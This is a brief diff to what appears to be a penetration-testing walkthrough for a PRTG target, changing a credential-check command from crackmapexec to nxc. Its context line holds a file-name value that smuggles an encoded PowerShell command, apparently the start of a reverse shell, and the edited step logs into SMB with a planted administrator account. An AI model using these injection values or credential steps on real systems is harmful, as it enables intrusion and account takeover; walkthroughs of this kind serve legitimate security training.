@@ -43,7 +43,7 @@ test.txt;powershell -e JABjAGwAaQBlAG4AdAA9...BASE64_PAYLOAD
 ### Verify Access
 
 ```bash
-crackmapexec smb TARGET -u prtgadm1 -p 'Pwn3d_by_PRTG!'
+nxc smb TARGET -u prtgadm1 -p 'Pwn3d_by_PRTG!'
 ```
 
 ---
